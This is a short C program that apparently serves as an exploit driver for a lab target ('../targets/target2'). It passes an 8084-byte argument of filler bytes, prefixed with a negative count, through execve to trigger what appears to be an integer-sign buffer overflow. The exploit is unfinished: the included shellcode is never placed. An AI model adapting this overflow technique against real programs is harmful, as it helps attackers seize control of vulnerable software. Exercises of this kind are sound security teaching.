#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode.h"

#define TARGET "../targets/target2"

int main(void)
{
/*	char arg1[] == "1,\xC1\xFE\xD1\xAE\xC1\xFE\xD1\xAE\xC1\xFE\xD1\xAE\x55\x55\xaa\xaa";
*/	
	char arg1[8084];
	char *args[] = { TARGET, arg1, NULL };
	char *env[] = { NULL };	
	memset(arg1, 0x41 , 8084);
	//memcpy(arg1, "2147483648,", 11);
	memcpy(arg1, "-200,", 5);
	printf("new program\n\r");	
	if (0 > execve(TARGET, args, env))
		fprintf(stderr, "execve failed.\n");

	return 0;
}
